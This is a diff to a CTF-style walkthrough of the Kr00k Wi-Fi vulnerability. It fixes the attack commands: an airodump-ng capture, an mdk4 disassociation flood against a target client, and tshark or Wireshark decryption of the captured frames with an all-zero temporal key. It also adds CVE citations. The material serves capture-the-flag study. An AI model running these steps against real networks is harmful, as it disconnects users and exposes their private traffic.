@@ -1,5 +1,7 @@
 # Kr00k walkthrough
 
+**Verified against:** scapy 2.5 + tshark 4.2 as of 2026-Q3
+
 Force a disassoc on a vulnerable client, capture the tail frames it
 sends with PTK=0, decrypt them offline with a known-zero key.
 
@@ -19,18 +21,26 @@ sends with PTK=0, decrypt them offline with a known-zero key.
 airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan1mon
 
 # 2. Force a disassoc — this is the trigger, not a general deauth.
-aireplay-ng --disassoc 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon
+#    aireplay-ng has no --disassoc; use scapy/mdk4 to send real
+#    disassoc frames, or fall back to -0 (deauth) if the client
+#    treats deauth and disassoc equivalently at the chipset layer.
+#    Example with mdk4 disassoc-flood (mode d):
+mdk4 wlan1mon d -c 6 -B AA:BB:CC:DD:EE:FF
 
-# 3. Capture the tail frames the chipset flushes with PTK=0.
+# 3. Capture the tail frames the chipset flushes with TK=0.
 #    airodump keeps running from step 1; save the .cap.
 
-# 4. Decrypt offline. In Wireshark:
+# 4. Decrypt offline. Kr00k zeroes the **TK** (temporal key), not
+#    the PMK/PSK — so the tshark UAT entry must use key type "tk",
+#    matching KRACK-path-B. The zero key is 16 hex zeros for
+#    CCMP-128 / TKIP; 32 hex zeros for GCMP-256 or CCMP-256.
+#    In Wireshark:
 #       Edit -> Preferences -> Protocols -> IEEE 802.11
-#       Decryption keys: add key type "wpa-psk" with
-#                        16 zero bytes as hex (00 * 16)
+#       Decryption keys: add key type "tk" with
+#                        16 zero bytes as hex (00 * 16) for CCMP-128
 #    Or with tshark:
 tshark -r kr00k.cap -o "wlan.enable_decryption:TRUE" \
-       -o "uat:80211_keys:\"wpa-psk\",\"00000000000000000000000000000000\""
+       -o "uat:80211_keys:\"tk\",\"00000000000000000000000000000000\""
 ```
 
 The plaintext of those tail frames is the flag surface. In a WCTF this
@@ -53,4 +63,9 @@ was actually visiting.
 ## Cite
 
 - ESET Kr00k white paper (§4 "Exploitation").
-- aircrack-ng documentation — aireplay-ng --disassoc.
+- CVE-2019-15126 — Broadcom/Cypress BCM43xx all-zero PTK on disassoc.
+- CVE-2020-3702 — Qualcomm Atheros variant (IPQ8064 / QCA9377 /
+  Snapdragon Wi-Fi front-ends).
+- aircrack-ng documentation — `aireplay-ng -0` (deauth); mdk4 mode
+  `d` (disassoc flood); `--disassoc` is not a valid aireplay-ng
+  flag.
